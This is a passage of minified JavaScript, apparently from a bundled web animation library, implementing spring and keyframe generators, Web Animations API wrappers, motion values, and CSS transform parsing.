w=M=>-j*Math.exp(-M/n),k=M=>I+w(M),Y=M=>{const N=w(M),L=k(M);E.done=Math.abs(N)<=p,E.value=E.done?I:L};let ee,Q;const q=M=>{C(E.value)&&(ee=M,Q=Uh({keyframes:[E.value,A(E.value)],velocity:ZN(k,M,E.value),damping:i,stiffness:r,restDelta:p,restSpeed:f}))};return q(0),{calculatedDuration:null,next:M=>{let N=!1;return!Q&&ee===void 0&&(N=!0,Y(M),q(M)),ee!==void 0&&M>=ee?Q.next(M-ee):(!N&&Y(M),E)}}}function xae(a,e,t){const n=[],i=t||$o.mix||$N,r=a.length-1;for(let l=0;l<r;l++){let u=i(a[l],a[l+1]);if(e){const d=Array.isArray(e)?e[l]||gn:e;u=Up(d,u)}n.push(u)}return n}function hS(a,e,{clamp:t=!0,ease:n,mixer:i}={}){const r=a.length;if(pp(r===e.length),r===1)return()=>e[0];if(r===2&&e[0]===e[1])return()=>e[1];const l=a[0]===a[1];a[0]>a[r-1]&&(a=[...a].reverse(),e=[...e].reverse());const u=xae(e,n,i),d=u.length,p=f=>{if(l&&f<a[0])return e[0];let h=0;if(d>1)for(;h<a.length-2&&!(f<a[h+1]);h++);const E=Uc(a[h],a[h+1],f);return u[h](E)};return t?f=>p(Pi(a[0],a[r-1],f)):p}function Aae(a,e){const t=a[a.length-1];for(let n=1;n<=e;n++){const i=Uc(0,e,n);a.push(Ja(t,1,i))}}function e_(a){const e=[0];return Aae(e,a.length-1),e}function Pae(a,e){return a.map(t=>t*e)}function Lae(a,e){return a.map(()=>e||zN).splice(0,a.length-1)}function Gd({duration:a=300,keyframes:e,times:t,ease:n="easeInOut"}){const i=zee(n)?n.map(LL):LL(n),r={done:!1,value:e[0]},l=Pae(t&&t.length===e.length?t:e_(e),a),u=hS(l,e,{ease:Array.isArray(i)?i:Lae(e,i)});return{calculatedDuration:a,next:d=>(r.value=u(d),r.done=d>=a,r)}}const Rae=a=>a!==null;function gS(a,{repeat:e,repeatType:t="loop"},n,i=1){const r=a.filter(Rae),u=i<0||e&&t!=="loop"&&e%2===1?0:r.length-1;return!u||n===void 0?r[u]:n}const Iae={decay:H0,inertia:H0,tween:Gd,keyframes:Gd,spring:Uh};function a_(a){typeof a.type=="string"&&(a.type=Iae[a.type])}class bS{constructor(){this.updateFinished()}get finished(){return this._finished}updateFinished(){this._finished=new Promise(e=>{this.resolve=e})}notifyFinished(){this.resolve()}then(e,t){return this.finished.then(e,t)}}const wae=a=>a/100;class Pg extends bS{constructor(e){super(),this.state="idle",this.startTime=null,this.isStopped=!1,this.currentTime=0,this.holdTime=null,this.playbackSpeed=1,this.stop=()=>{const{motionValue:t}=this.options;t&&t.updatedAt!==Zt.now()&&this.tick(Zt.now()),this.isStopped=!0,this.state!=="idle"&&(this.teardown(),this.options.onStop?.())},this.options=e,this.initAnimation(),this.play(),e.autoplay===!1&&this.pause()}initAnimation(){const{options:e}=this;a_(e);const{type:t=Gd,repeat:n=0,repeatDelay:i=0,repeatType:r,velocity:l=0}=e;let{keyframes:u}=e;const d=t||Gd;d!==Gd&&typeof u[0]!="number"&&(this.mixKeyframes=Up(wae,$N(u[0],u[1])),u=[0,100]);const p=d({...e,keyframes:u});r==="mirror"&&(this.mirroredGenerator=d({...e,keyframes:[...u].reverse(),velocity:-l})),p.calculatedDuration===null&&(p.calculatedDuration=fS(p));const{calculatedDuration:f}=p;this.calculatedDuration=f,this.resolvedDuration=f+i,this.totalDuration=this.resolvedDuration*(n+1)-i,this.generator=p}updateTime(e){const t=Math.round(e-this.startTime)*this.playbackSpeed;this.holdTime!==null?this.currentTime=this.holdTime:this.currentTime=t}tick(e,t=!1){const{generator:n,totalDuration:i,mixKeyframes:r,mirroredGenerator:l,resolvedDuration:u,calculatedDuration:d}=this;if(this.startTime===null)return n.next(0);const{delay:p=0,keyframes:f,repeat:h,repeatType:E,repeatDelay:C,type:A,onUpdate:j,finalKeyframe:R}=this.options;this.speed>0?this.startTime=Math.min(this.startTime,e):this.speed<0&&(this.startTime=Math.min(e-i/this.speed,this.startTime)),t?this.currentTime=e:this.updateTime(e);const I=this.currentTime-p*(this.playbackSpeed>=0?1:-1),w=this.playbackSpeed>=0?I<0:I>i;this.currentTime=Math.max(I,0),this.state==="finished"&&this.holdTime===null&&(this.currentTime=i);let k=this.currentTime,Y=n;if(h){const M=Math.min(this.currentTime,i)/u;let N=Math.floor(M),L=M%1;!L&&M>=1&&(L=1),L===1&&N--,N=Math.min(N,h+1),N%2&&(E==="reverse"?(L=1-L,C&&(L-=C/u)):E==="mirror"&&(Y=l)),k=Pi(0,1,L)*u}const ee=w?{done:!1,value:f[0]}:Y.next(k);r&&(ee.value=r(ee.value));let{done:Q}=ee;!w&&d!==null&&(Q=this.playbackSpeed>=0?this.currentTime>=i:this.currentTime<=0);const q=this.holdTime===null&&(this.state==="finished"||this.state==="running"&&Q);return q&&A!==H0&&(ee.value=gS(f,this.options,R,this.speed)),j&&j(ee.value),q&&this.finish(),ee}then(e,t){return this.finished.then(e,t)}get duration(){return Xn(this.calculatedDuration)}get iterationDuration(){const{delay:e=0}=this.options||{};return this.duration+Xn(e)}get time(){return Xn(this.currentTime)}set time(e){e=Ti(e),this.currentTime=e,this.startTime===null||this.holdTime!==null||this.playbackSpeed===0?this.holdTime=e:this.driver&&(this.startTime=this.driver.now()-e/this.playbackSpeed),this.driver?.start(!1)}get speed(){return this.playbackSpeed}set speed(e){this.updateTime(Zt.now());const t=this.playbackSpeed!==e;this.playbackSpeed=e,t&&(this.time=Xn(this.currentTime))}play(){if(this.isStopped)return;const{driver:e=hae,startTime:t}=this.options;this.driver||(this.driver=e(i=>this.tick(i))),this.options.onPlay?.();const n=this.driver.now();this.state==="finished"?(this.updateFinished(),this.startTime=n):this.holdTime!==null?this.startTime=n-this.holdTime:this.startTime||(this.startTime=t??n),this.state==="finished"&&this.speed<0&&(this.startTime+=this.calculatedDuration),this.holdTime=null,this.state="running",this.driver.start()}pause(){this.state="paused",this.updateTime(Zt.now()),this.holdTime=this.currentTime}complete(){this.state!=="running"&&this.play(),this.state="finished",this.holdTime=null}finish(){this.notifyFinished(),this.teardown(),this.state="finished",this.options.onComplete?.()}cancel(){this.holdTime=null,this.startTime=0,this.tick(0),this.teardown(),this.options.onCancel?.()}teardown(){this.state="idle",this.stopDriver(),this.startTime=this.holdTime=null}stopDriver(){this.driver&&(this.driver.stop(),this.driver=void 0)}sample(e){return this.startTime=0,this.tick(e,!0)}attachTimeline(e){return this.options.allowFlatten&&(this.options.type="keyframes",this.options.ease="linear",this.initAnimation()),this.driver?.stop(),e.observe(this)}}function jae(a){for(let e=1;e<a.length;e++)a[e]??(a[e]=a[e-1])}const $r=a=>a*180/Math.PI,G0=a=>{const e=$r(Math.atan2(a[1],a[0]));return Q0(e)},Dae={x:4,y:5,translateX:4,translateY:5,scaleX:0,scaleY:3,scale:a=>(Math.abs(a[0])+Math.abs(a[3]))/2,rotate:G0,rotateZ:G0,skewX:a=>$r(Math.atan(a[1])),skewY:a=>$r(Math.atan(a[2])),skew:a=>(Math.abs(a[1])+Math.abs(a[2]))/2},Q0=a=>(a=a%360,a<0&&(a+=360),a),NL=G0,_L=a=>Math.sqrt(a[0]*a[0]+a[1]*a[1]),qL=a=>Math.sqrt(a[4]*a[4]+a[5]*a[5]),Mae={x:12,y:13,z:14,translateX:12,translateY:13,translateZ:14,scaleX:_L,scaleY:qL,scale:a=>(_L(a)+qL(a))/2,rotateX:a=>Q0($r(Math.atan2(a[6],a[5]))),rotateY:a=>Q0($r(Math.atan2(-a[2],a[0]))),rotateZ:NL,rotate:NL,skewX:a=>$r(Math.atan(a[4])),skewY:a=>$r(Math.atan(a[1])),skew:a=>(Math.abs(a[1])+Math.abs(a[4]))/2};function J0(a){return a.includes("scale")?1:0}function W0(a,e){if(!a||a==="none")return J0(e);const t=a.match(/^matrix3d\(([-\d.e\s,]+)\)$/u);let n,i;if(t)n=Mae,i=t;else{const u=a.match(/^matrix\(([-\d.e\s,]+)\)$/u);n=Dae,i=u}if(!i)return J0(e);const r=n[e],l=i[1].split(",").map(_ae);return typeof r=="function"?r(l):l[r]}const Nae=(a,e)=>{const{transform:t="none"}=getComputedStyle(a);return W0(t,e)};function _ae(a){return parseFloat(a.trim())}const nu=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],iu=new Set(nu),kL=a=>a===tu||a===Ne,qae=new Set(["x","y","z"]),kae=nu.filter(a=>!qae.has(a));function Oae(a){const e=[];return kae.forEach(t=>{const n=a.getValue(t);n!==void 0&&(e.push([t,n.get()]),n.set(t.startsWith("scale")?1:0))}),e}const Vs={width:({x:a},{paddingLeft:e="0",paddingRight:t="0"})=>a.max-a.min-parseFloat(e)-parseFloat(t),height:({y:a},{paddingTop:e="0",paddingBottom:t="0"})=>a.max-a.min-parseFloat(e)-parseFloat(t),top:(a,{top:e})=>parseFloat(e),left:(a,{left:e})=>parseFloat(e),bottom:({y:a},{top:e})=>parseFloat(e)+(a.max-a.min),right:({x:a},{left:e})=>parseFloat(e)+(a.max-a.min),x:(a,{transform:e})=>W0(e,"x"),y:(a,{transform:e})=>W0(e,"y")};Vs.translateX=Vs.x;Vs.translateY=Vs.y;const al=new Set;let K0=!1,Y0=!1,$0=!1;function t_(){if(Y0){const a=Array.from(al).filter(n=>n.needsMeasurement),e=new Set(a.map(n=>n.element)),t=new Map;e.forEach(n=>{const i=Oae(n);i.length&&(t.set(n,i),n.render())}),a.forEach(n=>n.measureInitialState()),e.forEach(n=>{n.render();const i=t.get(n);i&&i.forEach(([r,l])=>{n.getValue(r)?.set(l)})}),a.forEach(n=>n.measureEndState()),a.forEach(n=>{n.suspendedScrollY!==void 0&&window.scrollTo(0,n.suspendedScrollY)})}Y0=!1,K0=!1,al.forEach(a=>a.complete($0)),al.clear()}function n_(){al.forEach(a=>{a.readKeyframes(),a.needsMeasurement&&(Y0=!0)})}function Uae(){$0=!0,n_(),t_(),$0=!1}class vS{constructor(e,t,n,i,r,l=!1){this.state="pending",this.isAsync=!1,this.needsMeasurement=!1,this.unresolvedKeyframes=[...e],this.onComplete=t,this.name=n,this.motionValue=i,this.element=r,this.isAsync=l}scheduleResolve(){this.state="scheduled",this.isAsync?(al.add(this),K0||(K0=!0,va.read(n_),va.resolveKeyframes(t_))):(this.readKeyframes(),this.complete())}readKeyframes(){const{unresolvedKeyframes:e,name:t,element:n,motionValue:i}=this;if(e[0]===null){const r=i?.get(),l=e[e.length-1];if(r!==void 0)e[0]=r;else if(n&&t){const u=n.readValue(t,l);u!=null&&(e[0]=u)}e[0]===void 0&&(e[0]=l),i&&r===void 0&&i.set(e[0])}jae(e)}setFinalKeyframe(){}measureInitialState(){}renderEndStyles(){}measureEndState(){}complete(e=!1){this.state="complete",this.onComplete(this.unresolvedKeyframes,this.finalKeyframe,e),al.delete(this)}cancel(){this.state==="scheduled"&&(al.delete(this),this.state="pending")}resume(){this.state==="pending"&&this.scheduleResolve()}}const zae=a=>a.startsWith("--");function Bae(a,e,t){zae(e)?a.style.setProperty(e,t):a.style[e]=t}const Fae={};function i_(a,e){const t=jN(a);return()=>Fae[e]??t()}const o_=i_(()=>window.ScrollTimeline!==void 0,"scrollTimeline"),s_=i_(()=>{try{document.createElement("div").animate({opacity:0},{easing:"linear(0, 1)"})}catch{return!1}return!0},"linearEasing"),Ld=([a,e,t,n])=>`cubic-bezier(${a}, ${e}, ${t}, ${n})`,OL={linear:"linear",ease:"ease",easeIn:"ease-in",easeOut:"ease-out",easeInOut:"ease-in-out",circIn:Ld([0,.65,.55,1]),circOut:Ld([.55,0,1,.45]),backIn:Ld([.31,.01,.66,-.59]),backOut:Ld([.33,1.53,.69,.99])};function r_(a,e){if(a)return typeof a=="function"?s_()?XN(a,e):"ease-out":BN(a)?Ld(a):Array.isArray(a)?a.map(t=>r_(t,e)||OL.easeOut):OL[a]}function Vae(a,e,t,{delay:n=0,duration:i=300,repeat:r=0,repeatType:l="loop",ease:u="easeOut",times:d}={},p=void 0){const f={[e]:t};d&&(f.offset=d);const h=r_(u,i);Array.isArray(h)&&(f.easing=h);const E={delay:n,duration:i,easing:Array.isArray(h)?"linear":h,fill:"both",iterations:r+1,direction:l==="reverse"?"alternate":"normal"};return p&&(E.pseudoElement=p),a.animate(f,E)}function l_(a){return typeof a=="function"&&"applyToOptions"in a}function Hae({type:a,...e}){return l_(a)&&s_()?a.applyToOptions(e):(e.duration??(e.duration=300),e.ease??(e.ease="easeOut"),e)}class c_ extends bS{constructor(e){if(super(),this.finishedTime=null,this.isStopped=!1,this.manualStartTime=null,!e)return;const{element:t,name:n,keyframes:i,pseudoElement:r,allowFlatten:l=!1,finalKeyframe:u,onComplete:d}=e;this.isPseudoElement=!!r,this.allowFlatten=l,this.options=e,pp(typeof e.type!="string");const p=Hae(e);this.animation=Vae(t,n,i,p,r),p.autoplay===!1&&this.animation.pause(),this.animation.onfinish=()=>{if(this.finishedTime=this.time,!r){const f=gS(i,this.options,u,this.speed);this.updateMotionValue?this.updateMotionValue(f):Bae(t,n,f),this.animation.cancel()}d?.(),this.notifyFinished()}}play(){this.isStopped||(this.manualStartTime=null,this.animation.play(),this.state==="finished"&&this.updateFinished())}pause(){this.animation.pause()}complete(){this.animation.finish?.()}cancel(){try{this.animation.cancel()}catch{}}stop(){if(this.isStopped)return;this.isStopped=!0;const{state:e}=this;e==="idle"||e==="finished"||(this.updateMotionValue?this.updateMotionValue():this.commitStyles(),this.isPseudoElement||this.cancel())}commitStyles(){const e=this.options?.element;!this.isPseudoElement&&e?.isConnected&&this.animation.commitStyles?.()}get duration(){const e=this.animation.effect?.getComputedTiming?.().duration||0;return Xn(Number(e))}get iterationDuration(){const{delay:e=0}=this.options||{};return this.duration+Xn(e)}get time(){return Xn(Number(this.animation.currentTime)||0)}set time(e){this.manualStartTime=null,this.finishedTime=null,this.animation.currentTime=Ti(e)}get speed(){return this.animation.playbackRate}set speed(e){e<0&&(this.finishedTime=null),this.animation.playbackRate=e}get state(){return this.finishedTime!==null?"finished":this.animation.playState}get startTime(){return this.manualStartTime??Number(this.animation.startTime)}set startTime(e){this.manualStartTime=this.animation.startTime=e}attachTimeline({timeline:e,observe:t}){return this.allowFlatten&&this.animation.effect?.updateTiming({easing:"linear"}),this.animation.onfinish=null,e&&o_()?(this.animation.timeline=e,gn):t(this)}}const u_={anticipate:kN,backInOut:qN,circInOut:UN};function Gae(a){return a in u_}function Qae(a){typeof a.ease=="string"&&Gae(a.ease)&&(a.ease=u_[a.ease])}const Ly=10;class Jae extends c_{constructor(e){Qae(e),a_(e),super(e),e.startTime!==void 0&&(this.startTime=e.startTime),this.options=e}updateMotionValue(e){const{motionValue:t,onUpdate:n,onComplete:i,element:r,...l}=this.options;if(!t)return;if(e!==void 0){t.set(e);return}const u=new Pg({...l,autoplay:!1}),d=Math.max(Ly,Zt.now()-this.startTime),p=Pi(0,Ly,d-Ly);t.setWithVelocity(u.sample(Math.max(0,d-p)).value,u.sample(d).value,p),u.stop()}}const UL=(a,e)=>e==="zIndex"?!1:!!(typeof a=="number"||Array.isArray(a)||typeof a=="string"&&(xi.test(a)||a==="0")&&!a.startsWith("url("));function Wae(a){const e=a[0];if(a.length===1)return!0;for(let t=0;t<a.length;t++)if(a[t]!==e)return!0}function Kae(a,e,t,n){const i=a[0];if(i===null)return!1;if(e==="display"||e==="visibility")return!0;const r=a[a.length-1],l=UL(i,e),u=UL(r,e);return!l||!u?!1:Wae(a)||(t==="spring"||l_(t))&&n}function X0(a){a.duration=0,a.type="keyframes"}const Yae=new Set(["opacity","clipPath","filter","transform"]),$ae=jN(()=>Object.hasOwnProperty.call(Element.prototype,"animate"));function Xae(a){const{motionValue:e,name:t,repeatDelay:n,repeatType:i,damping:r,type:l}=a;if(!(e?.owner?.current instanceof HTMLElement))return!1;const{onUpdate:d,transformTemplate:p}=e.owner.getProps();return $ae()&&t&&Yae.has(t)&&(t!=="transform"||!p)&&!d&&!n&&i!=="mirror"&&r!==0&&l!=="inertia"}const Zae=40;class ete extends bS{constructor({autoplay:e=!0,delay:t=0,type:n="keyframes",repeat:i=0,repeatDelay:r=0,repeatType:l="loop",keyframes:u,name:d,motionValue:p,element:f,...h}){super(),this.stop=()=>{this._animation&&(this._animation.stop(),this.stopTimeline?.()),this.keyframeResolver?.cancel()},this.createdAt=Zt.now();const E={autoplay:e,delay:t,type:n,repeat:i,repeatDelay:r,repeatType:l,name:d,motionValue:p,element:f,...h},C=f?.KeyframeResolver||vS;this.keyframeResolver=new C(u,(A,j,R)=>this.onKeyframesResolved(A,j,E,!R),d,p,f),this.keyframeResolver?.scheduleResolve()}onKeyframesResolved(e,t,n,i){this.keyframeResolver=void 0;const{name:r,type:l,velocity:u,delay:d,isHandoff:p,onUpdate:f}=n;this.resolvedAt=Zt.now(),Kae(e,r,l,u)||(($o.instantAnimations||!d)&&f?.(gS(e,n,t)),e[0]=e[e.length-1],X0(n),n.repeat=0);const E={startTime:i?this.resolvedAt?this.resolvedAt-this.createdAt>Zae?this.resolvedAt:this.createdAt:this.createdAt:void 0,finalKeyframe:t,...n,keyframes:e},C=!p&&Xae(E),A=E.motionValue?.owner?.current,j=C?new Jae({...E,element:A}):new Pg(E);j.finished.then(()=>{this.notifyFinished()}).catch(gn),this.pendingTimeline&&(this.stopTimeline=j.attachTimeline(this.pendingTimeline),this.pendingTimeline=void 0),this._animation=j}get finished(){return this._animation?this.animation.finished:this._finished}then(e,t){return this.finished.finally(e).then(()=>{})}get animation(){return this._animation||(this.keyframeResolver?.resume(),Uae()),this._animation}get duration(){return this.animation.duration}get iterationDuration(){return this.animation.iterationDuration}get time(){return this.animation.time}set time(e){this.animation.time=e}get speed(){return this.animation.speed}get state(){return this.animation.state}set speed(e){this.animation.speed=e}get startTime(){return this.animation.startTime}attachTimeline(e){return this._animation?this.stopTimeline=this.animation.attachTimeline(e):this.pendingTimeline=e,()=>this.stop()}play(){this.animation.play()}pause(){this.animation.pause()}complete(){this.animation.complete()}cancel(){this._animation&&this.animation.cancel(),this.keyframeResolver?.cancel()}}function d_(a,e,t,n=0,i=1){const r=Array.from(a).sort((p,f)=>p.sortNodePosition(f)).indexOf(e),l=a.size,u=(l-1)*n;return typeof t=="function"?t(r,l):i===1?r*n:u-r*n}const ate=/^var\(--(?:([\w-]+)|([\w-]+), ?([a-zA-Z\d ()%#.,-]+))\)/u;function tte(a){const e=ate.exec(a);if(!e)return[,];const[,t,n,i]=e;return[`--${t??n}`,i]}function p_(a,e,t=1){const[n,i]=tte(a);if(!n)return;const r=window.getComputedStyle(e).getPropertyValue(n);if(r){const l=r.trim();return RN(l)?parseFloat(l):l}return uS(i)?p_(i,e,t+1):i}const nte={type:"spring",stiffness:500,damping:25,restSpeed:10},ite=a=>({type:"spring",stiffness:550,damping:a===0?2*Math.sqrt(550):30,restSpeed:10}),ote={type:"keyframes",duration:.8},ste={type:"keyframes",ease:[.25,.1,.35,1],duration:.3},rte=(a,{keyframes:e})=>e.length>2?ote:iu.has(a)?a.startsWith("scale")?ite(e[1]):nte:ste,lte=a=>a!==null;function cte(a,{repeat:e,repeatType:t="loop"},n){const i=a.filter(lte),r=e&&t!=="loop"&&e%2===1?0:i.length-1;return i[r]}function m_(a,e){if(a?.inherit&&e){const{inherit:t,...n}=a;return{...e,...n}}return a}function yS(a,e){const t=a?.[e]??a?.default??a;return t!==a?m_(t,a):t}function ute({when:a,delay:e,delayChildren:t,staggerChildren:n,staggerDirection:i,repeat:r,repeatType:l,repeatDelay:u,from:d,elapsed:p,...f}){return!!Object.keys(f).length}const ES=(a,e,t,n={},i,r)=>l=>{const u=yS(n,a)||{},d=u.delay||n.delay||0;let{elapsed:p=0}=n;p=p-Ti(d);const f={keyframes:Array.isArray(t)?t:[null,t],ease:"easeOut",velocity:e.getVelocity(),...u,delay:-p,onUpdate:E=>{e.set(E),u.onUpdate&&u.onUpdate(E)},onComplete:()=>{l(),u.onComplete&&u.onComplete()},name:a,motionValue:e,element:r?void 0:i};ute(u)||Object.assign(f,rte(a,f)),f.duration&&(f.duration=Ti(f.duration)),f.repeatDelay&&(f.repeatDelay=Ti(f.repeatDelay)),f.from!==void 0&&(f.keyframes[0]=f.from);let h=!1;if((f.type===!1||f.duration===0&&!f.repeatDelay)&&(X0(f),f.delay===0&&(h=!0)),($o.instantAnimations||$o.skipAnimations||i?.shouldSkipAnimations)&&(h=!0,X0(f),f.delay=0),f.allowFlatten=!u.type&&!u.ease,h&&!r&&e.get()!==void 0){const E=cte(f.keyframes,u);if(E!==void 0){va.update(()=>{f.onUpdate(E),f.onComplete()});return}}return u.isSync?new Pg(f):new ete(f)};function zL(a){const e=[{},{}];return a?.values.forEach((t,n)=>{e[0][n]=t.get(),e[1][n]=t.getVelocity()}),e}function SS(a,e,t,n){if(typeof e=="function"){const[i,r]=zL(n);e=e(t!==void 0?t:a.custom,i,r)}if(typeof e=="string"&&(e=a.variants&&a.variants[e]),typeof e=="function"){const[i,r]=zL(n);e=e(t!==void 0?t:a.custom,i,r)}return e}function Rc(a,e,t){const n=a.getProps();return SS(n,e,t!==void 0?t:n.custom,a)}const f_=new Set(["width","height","top","left","right","bottom",...nu]),BL=30,dte=a=>!isNaN(parseFloat(a)),Qd={current:void 0};class pte{constructor(e,t={}){this.canTrackVelocity=null,this.events={},this.updateAndNotify=n=>{const i=Zt.now();if(this.updatedAt!==i&&this.setPrevFrameValue(),this.prev=this.current,this.setCurrent(n),this.current!==this.prev&&(this.events.change?.notify(this.current),this.dependents))for(const r of this.dependents)r.dirty()},this.hasAnimated=!1,this.setCurrent(e),this.owner=t.owner}setCurrent(e){this.current=e,this.updatedAt=Zt.now(),this.canTrackVelocity===null&&e!==void 0&&(this.canTrackVelocity=dte(this.current))}setPrevFrameValue(e=this.current){this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt}onChange(e){return this.on("change",e)}on(e,t){this.events[e]||(this.events[e]=new sS);const n=this.events[e].add(t);return e==="change"?()=>{n(),va.read(()=>{this.events.change.getSize()||this.stop()})}:n}clearListeners(){for(const e in this.events)this.events[e].clear()}attach(e,t){this.passiveEffect=e,this.stopPassiveEffect=t}set(e){this.passiveEffect?this.passiveEffect(e,this.updateAndNotify):this.updateAndNotify(e)}setWithVelocity(e,t,n){this.set(t),this.prev=void 0,this.prevFrameValue=e,this.prevUpdatedAt=this.updatedAt-n}jump(e,t=!0){this.updateAndNotify(e),this.prev=e,this.prevUpdatedAt=this.prevFrameValue=void 0,t&&this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}dirty(){this.events.change?.notify(this.current)}addDependent(e){this.dependents||(this.dependents=new Set),this.dependents.add(e)}removeDependent(e){this.dependents&&this.dependents.delete(e)}get(){return Qd.current&&Qd.current.push(this),this.current}getPrevious(){return this.prev}getVelocity(){const e=Zt.now();if(!this.canTrackVelocity||this.prevFrameValue===void 0||e-this.updatedAt>BL)return 0;const t=Math.min(this.updatedAt-this.prevUpdatedAt,BL);return rS(parseFloat(this.current)-parseFloat(this.prevFrameValue),t)}start(e){return this.stop(),new Promise(t=>{this.hasAnimated=!0,this.animation=e(t),this.events.animationStart&&this.events.animationStart.notify()}).then(()=>{this.events.animationComplete&&this.events.animationComplete.notify(),this.clearAnimation()})}stop(){this.animation&&(this.animation.stop(),this.events.animationCancel&&this.events.animationCancel.notify()),this.clearAnimation()}isAnimating(){return!!this.animation}clearAnimation(){delete this.animation}destroy(){this.dependents?.clear(),this.events.destroy?.notify(),this.clearListeners(),this.stop(),this.stopPassiveEffect&&this.stopPassiveEffect()}}function yi(a,e){return new pte(a,e)}const Z0=a=>Array.isArray(a);function mte(a,e,t){a.hasValue(e)?a.getValue(e).set(t):a.addValue(e,yi(t))}function fte(a){return Z0(a)?a[a.length-1]||0:a}function hte(a,e){const t=Rc(a,e);let{transitionEnd:n={},transition:i={},...r}=t||{};r={...r,...n};for(const l in r){const u=fte(r[l]);mte(a,l,u)}}const wt=a=>!!(a&&a.getVelocity);function gte(a){return!!(wt(a)&&a.add)}function eE(a,e){const t=a.getValue("willChange");if(gte(t))return t.add(e);if(!t&&$o.WillChange){const n=new $o.WillChange("auto");a.addValue("willChange",n),n.add(e)}}function CS(a){return a.replace(/([A-Z])/g,e=>`-${e.toLowerCase()}`)}const bte="framerAppearId",h_="data-"+CS(bte);function g_(a){return a.props[h_]}function vte({protectedKeys:a,needsAnimating:e},t){const n=a.hasOwnProperty(t)&&e[t]!==!0;return e[t]=!1,n}function b_(a,e,{delay:t=0,transitionOverride:n,type:i}={}){let{transition:r,transitionEnd:l,...u}=e;const d=a.getDefaultTransition();r=r?m_(r,d):d;const p=r?.reduceMotion;n&&(r=n);const f=[],h=i&&a.animationState&&a.animationState.getState()[i];for(const E in u){const C=a.getValue(E,a.latestValues[E]??null),A=u[E];if(A===void 0||h&&vte(h,E))continue;const j={delay:t,...yS(r||{},E)},R=C.get();if(R!==void 0&&!C.isAnimating&&!Array.isArray(A)&&A===R&&!j.velocity)continue;let I=!1;if(window.MotionHandoffAnimation){const Y=g_(a);if(Y){const ee=window.MotionHandoffAnimation(Y,E,va);ee!==null&&(j.startTime=ee,I=!0)}}eE(a,E);const w=p??a.shouldReduceMotion;C.start(ES(E,C,A,w&&f_.has(E)?{type:!1}:j,a,I));const k=C.animation;k&&f.push(k)}if(l){const E=()=>va.update(()=>{l&&hte(a,l)});f.length?Promise.all(f).then(E):E()}return f}function aE(a,e,t={}){const n=Rc(a,e,t.type==="exit"?a.presenceContext?.custom:void 0);let{transition:i=a.getDefaultTransition()||{}}=n||{};t.transitionOverride&&(i=t.transitionOverride);const r=n?()=>Promise.all(b_(a,n,t)):()=>Promise.resolve(),l=a.variantChildren&&a.variantChildren.size?(d=0)=>{const{delayChildren:p=0,staggerChildren:f,staggerDirection:h}=i;return yte(a,e,d,p,f,h,t)}:()=>Promise.resolve(),{when:u}=i;if(u){const[d,p]=u==="beforeChildren"?[r,l]:[l,r];return d().then(()=>p())}else return Promise.all([r(),l(t.delay)])}function yte(a,e,t=0,n=0,i=0,r=1,l){const u=[];for(const d of a.variantChildren)d.notify("AnimationStart",e),u.push(aE(d,e,{...l,delay:t+(typeof n=="function"?0:n)+d_(a.variantChildren,d,n,i,r)}).then(()=>d.notify("AnimationComplete",e)));return Promise.all(u)}function Ete(a,e,t={}){a.notify("AnimationStart",e);let n;if(Array.isArray(e)){const i=e.map(r=>aE(a,r,t));n=Promise.all(i)}else if(typeof e=="string")n=aE(a,e,t);else{const i=typeof e=="function"?Rc(a,e,t.custom):e;n=Promise.all(b_(a,i,t))}return n.then(()=>{a.notify("AnimationComplete",e)})}const Ste={test:a=>a==="auto",parse:a=>a},v_=a=>e=>e.test(a),y_=[tu,Ne,ro,Os,Zee,Xee,Ste],FL=a=>y_.find(v_(a));function Cte(a){return typeof a=="number"?a===0:a!==null?a==="none"||a==="0"||wN(a):!0}const Tte=new Set(["brightness","contrast","saturate","opacity"]);function xte(a){const[e,t]=a.slice(0,-1).split("(");if(e==="drop-shadow")return a;const[n]=t.match(dS)||[];if(!n)return a;const i=t.replace(n,"");let r=Tte.has(e)?1:0;return n!==t&&(r*=100),e+"("+r+i+")"}const Ate=/\b([a-z-]*)\(.*?\)/gu,tE={...xi,getAnimatableNone:a=>{const e=a.match(Ate);return e?e.map(xte).join(" "):a}},nE={...xi,getAnimatableNone:a=>{const e=xi.parse(a);return xi.createTransformer(a)(e.map(n=>typeof n=="number"?0:typeof n=="object"?{...n,alpha:1}:n))}},VL={...tu,transform:Math.round},Pte={rotate:Os,rotateX:Os,rotateY:Os,rotateZ:Os,scale:wf,scaleX:wf,scaleY:wf,scaleZ:wf,skew:Os,skewX:Os,skewY:Os,distance:Ne,translateX:Ne,translateY:Ne,translateZ:Ne,x:Ne,y:Ne,z:Ne,perspective:Ne,transformPerspective:Ne,opacity:mp,originX:IL,originY:IL,originZ:Ne},TS={borderWidth:Ne,borderTopWidth:Ne,borderRightWidth:Ne,borderBottomWidth:Ne,borderLeftWidth:Ne,borderRadius:Ne,borderTopLeftRadius:Ne,borderTopRightRadius:Ne,borderBottomRightRadius:Ne,borderBottomLeftRadius:Ne,width:Ne,maxWidth:Ne,height:Ne,maxHeight:Ne,top:Ne,right:Ne,bottom:Ne,left:Ne,inset:Ne,insetBlock:Ne,insetBlockStart:Ne,insetBlockEnd:Ne,insetInline:Ne,insetInlineStart:Ne,insetInlineEnd:Ne,padding:Ne,paddingTop:Ne,paddingRight:Ne,paddingBottom:Ne,paddingLeft:Ne,paddingBlock:Ne,paddingBlockStart:Ne,paddingBlockEnd:Ne,paddingInline:Ne,paddingInlineStart:Ne,paddingInlineEnd:Ne,margin:Ne,marginTop:Ne,marginRight:Ne,marginBottom:Ne,marginLeft:Ne,marginBlock:Ne,marginBlockStart:Ne,marginBlockEnd:Ne,marginInline:Ne,marginInlineStart:Ne,marginInlineEnd:Ne,fontSize:Ne,backgroundPositionX:Ne,backgroundPositionY:Ne,...Pte,zIndex:VL,fillOpacity:mp,strokeOpacity:mp,numOctaves:VL},Lte={...TS,color:mt,backgroundColor:mt,outlineColor:mt,fill:mt,stroke:mt,borderColor:mt,borderTopColor:mt,borderRightColor:mt,borderBottomColor:mt,borderLeftColor:mt,filter:tE,WebkitFilter:tE,mask:nE,WebkitMask:nE},E_=a=>Lte[a],Rte=new Set([tE,nE]);function S_(a,e){let t=E_(a);return Rte.has(t)||(t=xi),t.getAnimatableNone?t.getAnimatableNone(e):void 0}const Ite=new Set(["auto","none","0"]);function wte(a,e,t){let n=0,i;for(;n<a.length&&!i;){const r=a[n];typeof 